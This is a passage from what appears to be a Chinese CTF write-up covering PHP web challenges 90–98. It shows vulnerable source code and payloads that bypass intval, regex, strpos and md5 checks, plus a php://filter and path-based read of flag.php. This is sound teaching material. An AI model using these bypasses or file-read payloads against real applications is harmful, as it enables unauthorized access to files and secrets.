class="hljs-variable">$num</span>,<span class="hljs-number">0</span>)===<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><strong>解题思路：</strong></p>
<ol>
<li><strong>intval处理开头是数字的字符串时，返回值为开头的数</strong></li>
<li><strong>intval() int 函数如果base为0，则var中存在字母的话遇到字母就停止读取，但遇到e，会表示科学计数法</strong></li>
<li><strong>intval如果base是0，会通过检测 var 的格式来决定使用的进制，所以这里也可以使用进制绕过</strong></li>
</ol>
<p>​	*<strong>if(intval($num,0)&#x3D;&#x3D;&#x3D;4476){<br>​         <em>echo $flag;</em><br>​	<strong><strong><strong>这句话是base&#x3D;0,所以会对num的格式进行检测，相当于个解密</strong></strong><br>​	直接使用4476的16进制编码传上去</strong></strong></p>
<p>payload：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">num</span>=4476a<br>?<span class="hljs-attribute">num</span>=4476e1<br>?<span class="hljs-attribute">num</span>=0x117c<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="强类型比较"><a href="#强类型比较" class="headerlink" title="强类型比较"></a>强类型比较</h3><p>在php中，三个等号“&#x3D;&#x3D;&#x3D;”是全等比较运算符，用于比较两个操作数的值是否相等，同时检测它们的类型</p>
<p>是否相同；只有两边的值和数据类型都相等时，运算结果才是TRUE。可以使用<strong>进制转换</strong>进行绕过</p>
<hr>
<h2 id="web-91（正则匹配多行模式）"><a href="#web-91（正则匹配多行模式）" class="headerlink" title="web-91（正则匹配多行模式）"></a>web-91（正则匹配多行模式）</h2><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^php$/im&#x27;</span>, <span class="hljs-variable">$a</span>))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^php$/i&#x27;</span>, <span class="hljs-variable">$a</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;hacker&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;nonononono&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>解题思路：</p>
<p><strong>第一个preg_match匹配多行匹配“php”   第二个preg_match只能匹配第一行中的“php”</strong></p>
<p><strong>%0a是换行</strong></p>
<p>payload：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">cmd</span>=%0aphp<br>?<span class="hljs-attribute">cmd</span>=abc%0aphp<br>?<span class="hljs-attribute">cmd</span>=php%0a%0a<br>?<span class="hljs-attribute">cmd</span>=php%0aphp<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="正则匹配模式"><a href="#正则匹配模式" class="headerlink" title="正则匹配模式"></a>正则匹配模式</h3><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-operator">/</span>i表示匹配大小写<br><br>字符 <span class="hljs-operator">^</span> 和 $ 同时使用时，表示精确匹配，需要匹配以php开头和以php结尾<br><br>m<br>多(more)行匹配<br>若存在换行\n并且有开始<span class="hljs-operator">^</span>或结束<span class="hljs-variable">$符的情况下，</span><br>将以换行为分隔符，逐行进行匹配<br><span class="hljs-variable">$str</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;abc<span class="hljs-subst">\n</span>abc&quot;</span>;<br><span class="hljs-variable">$preg</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;/^abc$/m&quot;</span>;<br>preg_match(<span class="hljs-variable">$preg</span>, <span class="hljs-variable">$str</span>,<span class="hljs-variable">$matchs</span>);<br>这样其实是符合正则表达式的，因为匹配的时候 先是匹配换行符前面的，接着匹配换行符后面的，两个都是abc所以可以通过正则表达式<span class="hljs-operator">。</span><br><br>s<br>特殊字符圆点 . 中包含换行符<br>默认的圆点 . 是匹配除换行符 \n 之外的任何单字符，加上s之后, .包含换行符<br><span class="hljs-variable">$str</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;abggab<span class="hljs-subst">\n</span>acbs&quot;</span>;<br><span class="hljs-variable">$preg</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;/b./s&quot;</span>;<br>preg_match_all(<span class="hljs-variable">$preg</span>, <span class="hljs-variable">$str</span>,<span class="hljs-variable">$matchs</span>);<br>这样匹配到的有三个 bg b\n bs<br><br>g<br>全局匹配，查找所有匹配项<br><br><span class="hljs-type">A</span><br>强制从目标字符串开头匹配;<br><br><span class="hljs-type">D</span><br>如果使用<span class="hljs-variable">$限制结尾字符</span>,则不允许结尾有换行; <br><br>e<br>配合函数preg_replace()使用, 可以把匹配来的字符串当作正则表达式执行; <br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-92（intval）"><a href="#web-92（intval）" class="headerlink" title="web-92（intval）"></a>web-92（intval）</h2><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>==<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>)==<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>解题思路：</p>
<ol>
<li><strong>第一个判断变成弱类型比较，所以不能用4476a绕过。重点是intval的第二个参数base，base&#x3D;0时，intval会自动探测num的进制：如果num以0x开头，那么按16进制转换；如果num以0开头，默认按8进制转换；否则使用10进制。所以这个题用16进制绕过即可</strong></li>
<li><strong><code>intval()</code>将浮点数转化为整型，使得条件成立，所以可以使用浮点数绕过</strong></li>
</ol>
<p>payload：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">num</span>=0x117c<br>?<span class="hljs-attribute">num</span>=4476.1<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="弱类型比较"><a href="#弱类型比较" class="headerlink" title="弱类型比较"></a>弱类型比较</h3><p>在php中两个等号&#x3D;&#x3D;是弱类型比较，只需要值相等，不会检测类型是否相同，类型不同时会自动转换</p>
<p>特殊情况：0exxx类型字符串不管0e后的数字如何，都为0所以可以绕过弱类型比较</p>
<hr>
<h2 id="web-93（intval）"><a href="#web-93（intval）" class="headerlink" title="web-93（intval）"></a>web-93（intval）</h2><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>==<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-z]/i&quot;</span>, <span class="hljs-variable">$num</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>)==<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>解题思路：</p>
<ol>
<li><strong>这题字母比上题多加了个正则匹配，不能出现字母，所以十六进制绕过不行了，但是可以使用8进制绕过</strong>，<strong>注意这里10574要以0开头才会按8进制转换</strong></li>
<li><strong>也可以使用浮点数绕过</strong></li>
</ol>
<p>payload：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">num</span>=010574<br>?<span class="hljs-attribute">num</span>=4476.1<br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-94（intval）"><a href="#web-94（intval）" class="headerlink" title="web-94（intval）"></a>web-94（intval）</h2><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>===<span class="hljs-string">&quot;4476&quot;</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-z]/i&quot;</span>, <span class="hljs-variable">$num</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$num</span>, <span class="hljs-string">&quot;0&quot;</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>)===<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<p>解题思路：</p>
<p>这里多了个strpos函数来查找0第一次在字符串中出现的位置，如果没找到会返回false，所以我们的payload中必须有0且0不能在第一位，所以8进制绕过不能用了。但是还有三种绕过方式</p>
<p><strong>我们可以在<code>010574</code>前面加一个<code>+</code>号，这样0就不在第一位了，intval转换后变为4476。</strong></p>
<p><strong>因为第一个判断使用的是强类型比较，所以可以在010574前加一个空格。intval转换依旧变为4476</strong></p>
<p><strong>同理还可以使用浮点数4476.0绕过</strong></p>
<p>payload：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">num</span>=+010574<br>?num= 010574<br>?<span class="hljs-attribute">num</span>=4476.0<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="strpos"><a href="#strpos" class="headerlink" title="strpos()"></a>strpos()</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">strpos</span><span class="hljs-params">()</span></span> - 查找字符串在另一字符串中第一次出现的位置（区分大小写）<br><span class="hljs-function"><span class="hljs-title">stripos</span><span class="hljs-params">()</span></span> 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）<br><span class="hljs-function"><span class="hljs-title">strrpos</span><span class="hljs-params">()</span></span> - 查找字符串在另一字符串中最后一次出现的位置（区分大小写）<br><span class="hljs-function"><span class="hljs-title">strripos</span><span class="hljs-params">()</span></span> - 查找字符串在另一字符串中最后一次出现的位置（不区分大小写）<br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-95（intval）"><a href="#web-95（intval）" class="headerlink" title="web-95（intval）"></a>web-95（intval）</h2><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>==<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-z]|\./i&quot;</span>, <span class="hljs-variable">$num</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$num</span>, <span class="hljs-string">&quot;0&quot;</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!!!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>)===<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><strong>解题思路：还是要绕过strpos函数</strong></p>
<p><strong>多过滤了一个点，导致我们无法使用小数点绕过，但是可以在8进制绕过的基础上前面加个+号来绕过</strong></p>
<p><strong>空格和换行符同理</strong></p>
<p>payload：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">num</span>=+010574<br>?num= 010574<br>?<span class="hljs-attribute">num</span>=%0a010574<br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-96（按路径读取文件）"><a href="#web-96（按路径读取文件）" class="headerlink" title="web-96（按路径读取文件）"></a>web-96（按路径读取文件）</h2><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;u&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;u&#x27;</span>]==<span class="hljs-string">&#x27;flag.php&#x27;</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;u&#x27;</span>]);<br>    &#125;<br><br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>解题思路：</p>
<p><strong>这题要我们想办法读取flag.php，但是又不能直接传flag.php，可以利用路径来读，也可以使用php伪协议</strong></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?u</span>=<span class="hljs-regexp">/var/www</span><span class="hljs-regexp">/html/flag</span>.php	绝对路径<br><span class="hljs-string">?u</span>=./flag.php				相对路径<br><span class="hljs-string">?u</span>=<span class="hljs-symbol">php:</span>/<span class="hljs-regexp">/filter/resource</span>=flag.php	php伪协议<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="highlight-file"><a href="#highlight-file" class="headerlink" title="highlight_file()"></a>highlight_file()</h3><p><code>highlight_file()</code> 函数用于将指定文件的内容以 HTML 格式进行高亮显示，并输出到浏览器。</p>
<p>语法：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">string</span> <span class="hljs-variable">$filename</span>, <span class="hljs-keyword">bool</span> <span class="hljs-variable">$return</span> = <span class="hljs-literal">false</span>)<br></code></pre></td></tr></table></figure>

<p>参数：</p>
<ul>
<li><code>$filename</code>：必需，要高亮显示的文件路径。</li>
<li><code>$return</code>：可选，如果设置为 <code>true</code>，则返回高亮显示的文件内容，否则将内容直接输出到浏览器。</li>
</ul>
<p>返回值： 如果 <code>$return</code> 参数设置为 <code>true</code>，则返回高亮显示的文件内容；否则没有返回值。</p>
<p>示例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>highlight_file(<span class="hljs-string">&quot;example.php&quot;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>上述示例将会将名为 <code>example.php</code> 的文件内容以 HTML 格式进行高亮显示，并输出到浏览器。</p>
<hr>
<h2 id="web-97（md5函数漏洞）"><a href="#web-97（md5函数漏洞）" class="headerlink" title="web-97（md5函数漏洞）"></a>web-97（md5函数漏洞）</h2><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>])) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>] != <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>])<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;Wrong.&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>解题思路：</p>
<p>这里我们用post传的值a和b需要不等，而且在md5函数处理后要全等</p>
<p><strong>利用数组</strong></p>
<p><strong>MD5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。</strong></p>
<p>payload：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">POST：<span class="hljs-selector-tag">a</span><span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;<span class="hljs-selector-tag">b</span><span class="hljs-selector-attr">[]</span>=<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>

<hr>
<h3 id="md5-加密函数"><a href="#md5-加密函数" class="headerlink" title="md5()加密函数"></a>md5()加密函数</h3><p><a target="_blank" rel="noopener" href="https://www.runoob.com/php/func-string-md5.html">md5函数用法</a></p>
<p>md5() 函数计算字符串的 MD5 散列。</p>
<p>md5() 函数使用 RSA 数据安全，包括 MD5 报文摘要算法。</p>
<p>来自 RFC 1321 的解释 -  MD5 报文摘要算法：<em>MD5 报文摘要算法将任意长度的信息作为输入值，并将其换算成一个 128  位长度的”指纹信息”或”报文摘要”值来代表这个输入值，并以换算后的值作为结果。MD5  算法主要是为数字签名应用程序而设计的；在这个数字签名应用程序中，较大的文件将在加密（这里的加密过程是通过在一个密码系统下[如：RSA]的公开密钥下设置私有密钥而完成的）之前以一种安全的方式进行压缩。</em></p>
<p>如需计算文件的 MD5 散列，请使用 <a target="_blank" rel="noopener" href="https://www.runoob.com/php/func-string-md5-file.html">md5_file()</a> 函数。</p>
<p><strong>md5() 函数不能处理数组，数组都返回 null，md5(a[])  结果为 null。</strong></p>
<hr>
<h2 id="web-98（审计、传参、引用）"><a href="#web-98（审计、传参、引用）" class="headerlink" title="web-98（审计、传参、引用）"></a>web-98（审计、传参、引用）</h2><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-variable">$_GET</span>?<span class="hljs-variable">$_GET</span>=&amp;<span class="hljs-variable">$_POST</span>:<span class="hljs-string">&#x27;flag&#x27;</span>;<br><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]==<span class="hljs-string">&#x27;flag&#x27;</span>?<span class="hljs-variable">$_GET</span>=&amp;<span class="hljs-variable">$_COOKIE</span>:<span class="hljs-string">&#x27;flag&#x27;</span>;<br><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]==<span class="hljs-string">&#x27;flag&#x27;</span>?<span class="hljs-variable">$_GET</span>=&amp;<span class="hljs-variable">$_SERVER</span>:<span class="hljs-string">&#x27;flag&#x27;</span>;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="hljs-string">&#x27;flag&#x27;</span>?<span class="hljs-variable">$flag</span>:<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>解题思路：</p>
<p><strong>&amp;是引用符号，意思是：不同的名字访问同一个变量内容。php的引用是在变量或者函数、对象等前面加上&amp;符号，PHP 的引用允许你用两个变量来指向同一个内容</strong></p>
<p><strong>$_GET?$_GET&#x3D;&amp;$_POST:’flag’;意思：如果存在get方式，就把post的地址传给get，相当于get,只不过要利用post传一下参数</strong></p>
<p><strong>highlight_file($_GET[‘HTTP_FLAG’]&#x3D;&#x3D;’flag’?$flag:FILE)意思：如果有通过GET方法传参’HTTP_FLAG&#x3D;flag’，就highlight_file($flag)。否则highlight_file(FILE)</strong></p>
<p>中间两行不用管</p>
<p>payload：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">GET：?111	随便传但是不能没有<br>POST：<span class="hljs-attribute">HTTP_FLAG</span>=flag<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><p><strong>&amp;符号的利用</strong></p>
<p>感觉有点像c里的取地址符，指针</p>
<p>比如：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>	var <span class="hljs-variable">$enter</span>;<br>	var <span class="hljs-variable">$secret</span>;<br>&#125;<br><br><br><span class="hljs-variable">$a</span> = new test();<br><span class="hljs-variable">$a</span>-&gt;enter = &amp;<span class="hljs-variable">$a</span>-&gt;secret;<br></code></pre></td></tr></table></figure>

